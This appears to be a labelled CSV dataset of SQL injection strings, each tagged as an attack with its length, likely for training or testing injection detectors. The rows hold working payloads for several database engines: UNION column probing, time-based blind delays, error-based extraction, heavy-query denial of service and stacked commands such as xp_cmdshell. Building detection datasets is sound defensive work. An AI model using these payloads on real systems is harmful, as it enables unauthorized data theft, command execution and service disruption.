sentence,attack_type_code,attack_type,len_payload
"1"" )  where 6255 = 6255 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  --",1,attack,141
""" )  AND SLEEP ( 5 )  AND  ( ""jEqL"" = ""jEqL",1,attack,43
"s.{s: select * from users where id = 1 or "".{"" or 1 = 1 -- 1",1,attack,60
"1' where 2373 = 2373 union all select null,null#",1,attack,48
"-5145' where 2334 = 2334 union all select 2334,2334,2334,2334--",1,attack,63
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( ""yNjQ"" = ""yNjQ",1,attack,306
"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and 'cxor' = 'cxor",1,attack,283
1' )  where 7908 = 7908 or sleep ( 5 ) --,1,attack,41
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""ALwq"" = ""ALwq",1,attack,131
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'cSmo' = 'cSmo",1,attack,306
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  'zKIq' LIKE 'zKIq",1,attack,182
"-6593"" )  union all select 6216,6216,6216,6216,6216,6216,6216#",1,attack,62
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,attack,196
"1%' )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and  ( '%' = '",1,attack,136
"sn: select * from users where id = '1' union select ""[""_,version (  )  -- 1'",1,attack,76
'  )  )   ) ; BEGIN DBMS_LOCK.SLEEP ( 5 ) ; END;-- AND   (  (   ( 'uuBp' = 'uuBp,1,attack,80
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""kkff"" = ""kkff",1,attack,197
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'Fbdy' = 'Fbdy",1,attack,113
"1', ( select  ( case when  ( 1570 = 1570 )  then  ( select 1570 from pg_sleep ( 5  )  )   else 1/ ( select 0 )  end  )  )  ",1,attack,121
"-9606 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113",1,attack,255
"1%' )  union all select null,null--",1,attack,35
"sv ( s: select * from users where id = 1 or ""@ ( "" or 1 = 1 -- 1",1,attack,64
so..&: select * from users where id = '1'<@.. or 1 = 1 -- 1',1,attack,60
1' and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ,1,attack,258
"1%"" )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and  ( ""%"" = """,1,attack,77
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( ""GcpC"" = ""GcpC",1,attack,235
1%' and 9198 = 9198--,1,attack,21
"-5606  )  )   or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1,attack,178
 or 1 in  ( select @@version ) --,1,attack,32
"-4528"" )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( ""fxmt"" like ""fxmt",1,attack,137
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( ""JuyR"" = ""JuyR",1,attack,312
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND  ( ""bdie"" = ""bdie",1,attack,302
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'gVCG' LIKE 'gVCG",1,attack,327
 select * from users where id = 1.<@$ or 1 = 1 -- 1,1,attack,50
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( ""HKAT"" LIKE ""HKAT",1,attack,136
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""OhTO"" LIKE ""OhTO",1,attack,116
"-2745' or elt ( 1032 = 1032,3623 ) ",1,attack,34
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND 'TYbH' = 'TYbH",1,attack,145
"1 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  ",1,attack,82
"  )  )  ; CREATE OR REPLACE FUNCTION SLEEP ( int )  RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep ( 5 ) ;-- AND   (  (  3862 = 3862",1,attack,157
"1"" )  and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( ""tzog"" like ""tzog",1,attack,141
"' )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 'eIGZ' = 'eIGZ",1,attack,307
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""EsZY"" = ""EsZY",1,attack,245
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( 5553 = 5553",1,attack,260
" ORDER BY 1,SLEEP ( 5 ) ,BENCHMARK ( 1000000,MD5 ( 'A'  )  )  ,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",1,attack,106
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""rWRS"" LIKE ""rWRS",1,attack,290
"1' in boolean mode )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) #",1,attack,160
"-1504"" )  as wpes where 6256 = 6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",1,attack,103
"s.ns: select * from users where id = 1 or ""._"" or 1 = 1 -- 1",1,attack,60
 AS INJECTX WHERE 1 = 1 AND 1 = 0--,1,attack,34
"1' )  where 9454 = 9454 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,attack,165
"1"" and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) ",1,attack,315
"1'|| ( select 'dpce' from dual where 5261 = 5261 union all select null,null,null,null,null,null--",1,attack,97
; exec master..xp_cmdshell,1,attack,26
"' )  AND 4081 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 112 ) ||CHR ( 119 ) ||CHR ( 84 ) ||CHR ( 72 ) ,5 )  AND  ( 'cieD' LIKE 'cieD",1,attack,126
.on&1: select * from users where id = 1.<@$ or 1 = 1 -- 1,1,attack,57
select case when 2930 = 7964 then 1 else null end--,1,attack,51
"s1ns: select * from users where id = 1 or ""1_"" or 1 = 1 -- 1",1,attack,60
1  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1,attack,71
-9178' )  or 9779 = 6351,1,attack,24
"1"" )  where 9295 = 9295 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1,attack,296
"1' where 4102 = 4102 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1,attack,137
"s:1s: select * from users where id = 1 or "":1"" or 1 = 1 -- 1",1,attack,60
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#",1,attack,48
"select count ( * )  from generate_series ( 1,5000000 ) #",1,attack,56
"1"" where 9461 = 9461",1,attack,20
" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--",1,attack,104
' )  AND 1939 = 600--,1,attack,21
1 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  -- fyaq,1,attack,59
1 )  and  ( 2342 = 3620 ) *3620,1,attack,31
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'naFh' LIKE 'naFh",1,attack,338
"+if ( benchmark ( 3000000,MD5 ( 1  )  )  ,NULL,NULL ) ,NULL,NULL,NULL,NULL )  /*",1,attack,80
"1"" and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and ""epxq"" like ""epxq",1,attack,131
"""  )  )   )  AND SLEEP ( 5 ) --  AND   (  (   ( ""QKXG"" LIKE ""QKXG",1,attack,65
" select * from users where id = '1' %!<@ union select 1,version (  )  -- 1'",1,attack,74
"""  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( ""pmQo"" LIKE ""pmQo",1,attack,350
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'ciLF' LIKE 'ciLF",1,attack,141
"s:UEf: select * from users where id = 1 or 1#"": union select version (  ) ,version (  )  -- 1",1,attack,93
"-7797'+ ( select oulr where 7091 = 7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",1,attack,102
or 0 = 0 #,1,attack,10
"1"" )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and  ( ""vnso"" like ""vnso",1,attack,140
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND ""mmfy"" LIKE ""mmfy",1,attack,280
"' ) , ( select if ( count ( * ) ! = -1,benchmark ( 3000000,MD5 ( 1  )  )  ,benchmark ( 3000000,MD5 ( 1  )  )    )  )  --",1,attack,120
"1%' )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( '%' = '",1,attack,222
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'cGzr' LIKE 'cGzr",1,attack,291
 union select * from users where login  =  char ...,1,attack,50
"-3790"" )  as ojgb where 5925 = 5925 union all select 5925,5925#",1,attack,63
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'qAQX' LIKE 'qAQX",1,attack,296
"1""  )  )   and 8329 = 5584#",1,attack,27
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",1,attack,84
"1' )  as eany where 3169 = 3169 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,attack,149
""" UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND ""Fsfr"" = ""Fsfr",1,attack,278
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""ZHcq"" LIKE ""ZHcq",1,attack,338
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""eTlV"" LIKE ""eTlV",1,attack,302
" select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1",1,attack,60
"1%'  )  )   and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1,attack,68
"-5518 )  as yvqm where 7360 = 7360 union all select 7360,7360#",1,attack,62
"1%' union all select null,null,null,null,null,null,null,null,null--",1,attack,67
"-1772  )  )   or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char (",1,attack,255
"1' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and 'zlxw' = 'zlxw",1,attack,139
"1"" )  as aifd where 5962 = 5962",1,attack,31
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) -- vhmc",1,attack,88
-3339' or 8571 = 8571--,1,attack,23
"""  )  )   ) ",1,attack,11
"' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND 'WASO' = 'WASO",1,attack,259
"1'  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 'pded' = 'pded",1,attack,82
1'  )  )   as kgfp where 2366 = 2366,1,attack,36
"1'|| ( select 'tdcr' where 6792 = 6792 union all select null,null,null,null,null#",1,attack,81
"""  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (  ""CBnT"" LIKE ""CBnT",1,attack,284
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'vHmD' LIKE 'vHmD",1,attack,326
"-6198"" )  or make_set ( 3602 = 2178,2178 )  and  ( ""xksq"" like ""xksq",1,attack,68
"""  )  )   )  AND 9829 = 4267 AND   (  (   ( ""WSJV"" LIKE ""WSJV",1,attack,61
"1""  )  )   )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( ""tiet"" like ""tiet",1,attack,184
"-1949 )  as smyn where 4066 = 4066 union all select 4066,4066--",1,attack,63
-7021' or 3038 = 3038,1,attack,21
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (   ( '%' = '",1,attack,121
-8248 or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ,1,attack,107
1' )  or sleep ( 5 ) #,1,attack,22
1' where 2673 = 2673,1,attack,20
"' )  AND  ( SELECT 8121 FROM ( SELECT COUNT ( * ) ,CONCAT ( CHAR ( 58,99,108,122,58 ) , ( SELECT  ( CASE WHEN  ( 8121 = 8121 )  THEN 1 ELSE 0 END  )  )  ,CHAR ( 58,120,105,100,58 ) ,FLOOR ( RAND ( 0 ) *2  )  )  x FROM information_schema.tables GROUP BY x ) a ) ",1,attack,260
"""  )  )   )  AND 942 = CONVERT ( INT, ( CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 942 = 942 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( ""Uart"" LIKE ""Uart",1,attack,302
"-3063%""  )  )   )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ",1,attack,254
"1' or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and 'yfkk' = 'yfkk",1,attack,127
"'  )  )   UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (  'Enia' = 'Enia",1,attack,234
"-7725%'  )  )   union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",1,attack,79
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",1,attack,76
""" )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND  ( ""LFGo"" LIKE ""LFGo",1,attack,316
"1'|| ( select 'fqoz' where 9794 = 9794 union all select null,null,null,null,null--",1,attack,82
